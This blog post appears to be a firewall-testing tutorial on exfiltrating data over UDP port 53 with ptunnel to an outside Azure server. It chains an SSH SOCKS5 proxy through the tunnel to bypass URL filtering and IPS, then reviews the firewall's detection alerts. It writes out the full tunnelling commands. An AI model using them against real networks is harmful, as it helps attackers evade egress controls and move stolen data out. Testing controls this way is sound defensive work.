---
layout: post
title:  "Application Firewall Data Exfiltration over UDP (ptunnel)"
date:   2020-09-01 12:21:16 -0400
categories: exfiltration 
tags: app-id
---
<p>
Once an environment has been compromised and the adversary finds some desirable data the data needs to be removed from the network. In this use case we will assume that UDP is being permitted egress by the firewall.
</p>

<p>
ptunnel creates a tunnel interface on a system and then allows you to create a UDP tunnel between a clien
t and the server.
</p>
<p>
The server will need to be on the outside of your DUT (Device Under Testing). The idea is that the client
 will establish a tunnel to the server and be able to bypass the rest of the controls (URL Filtering, IPS, etc) in the network that the client is behind.
</p>


<h3>Step 1 - Deploy the ptunnel Server</h3>


<p>
In this case the ptunnel server is running on a host in Azure. Make sure the Azure Network Security Group is permitting port 53, or whichever port you decide to use to get around the DUT.
</p>

<p>
ptunnel may already be installed, but if not;
</p>

<code>
  apt-get install ptunnel
</code>
<br>
<br>


<p>
Once installed we can start the server. In this case we are enabling the UDP flag because ptunnel's default behaviour is to use ICMP (which is super slow). The -v enables visibility into what's going on. And -x boom is a password being set which is also optional.
<p>

<code>
  ptunnel -udp -v 4 -x boom
</code>
<br>
<br>

<img src="/images/appid-evasion-ptunnelserver.png">
<br>
<br>

<h3>Step 2 - Deploy the ptunnel Client</h3>

<p>
From a host behind the DUT run the ptunnel client. There are Windows binaries if you prefer but Linux is what we are using.
</p>

<p>
ptunnel may already be installed, but if not;
</p>

<code>
  apt-get install ptunnel
</code>
<br>
<br>

<p>
Once installed we can start the client. In this case we are again enabling the UDP flag. The -p IP address is the servers public IP address. The -lp 8080 is specifying a local port to proxy traffic through, and the -da localhost is specifying localhost as the proxy (in some circumstances you may want to use a different local IP). The -dp 22 is the destination port on the remote end we will be sending traffic through. And the -x boom is again the corresponding password.
</p>

<code>
  sudo /usr/sbin/ptunnel -udp -p 52.138.7.43 -lp 8080 -da localhost -dp 22 -x boom 
</code>

<img src="/images/appid-evasion-ptunnelclient.png">
<br>
<br>



<h3>Step 3 - Setup a Proxy</h3>


<p>
From the client system we will now configure an SSH SOCKS5 proxy. This will send all of our traffic over an encrypted SSH tunnel, through the UDP tunnel established by ptunnel. The main reason for this is ease of use. You could also setup a basic HTTP proxy like squid on the ptunnel server side.
</p>

<p>
To start the proxy from the client we ssh, specify the local port of 8080, -C compresses traffic, -D 8081 specifies to use 8081 as the SOCKS5 port, and -da localhost -dp 22 says to ssh into localhost. It is important to note that because we are actually using port 8080 this command is ssh'ing into the ptunnel host so remember to use the login for the ptunnel server and not actually localhost.
</p>

<code>
  ssh -p 8080 -C -D 8081 sperciballi@localhost
</code>
<br>
<br>

<img src="/images/appid-evasion-ptunnelssh.png">
<br>
<br>

<h3>Step 4 - Proxy Your Traffic</h3>

<p>
At this point we have essentially enabled a proxy within a proxy. Now we have to tell our client system software to use the proxy.
</p>

<p>
In your web browser preferences search for proxy. Then configure it to use a SOCKS5 proxy, specify localhost for the host and port 8081 (from step 3) for the port.
</p>

<img src="/images/appid-evasion-ptunnelproxy.png">
<br>
<br>

<p>
From here if you search for what's my IP you will find that the IP address is that of the public interface of the ptunnel server.
</p>


<h3>Step 5 - View the Results</h3>

<p>
Check back in on the NGFW to see how it interpretted this session.
</p>

<p>
From this one we can see that there were two alerts. One of them was a traffic log that shows traffic going over UDP port 53. The application is unknown-udp. While this is not ideal it's better to be designated as unknown-tcp which you should be working to manage out of your ruleset than misidentified as DNS or something else. You can also see that the traffic amounted to 5.3M which was me visiting a couple of websites. Also important to note that you won't see this log until the session is ended by default.
</p>

<p>
The second alert is an IPS alert indicating that there was non-compliant DNS traffic. These two things together are a good indicated that someone is tunneling and is reason to adjust policy.
</p>

<img src="/images/appid-evasion-ptunnelresults.png">
<br>
<br>

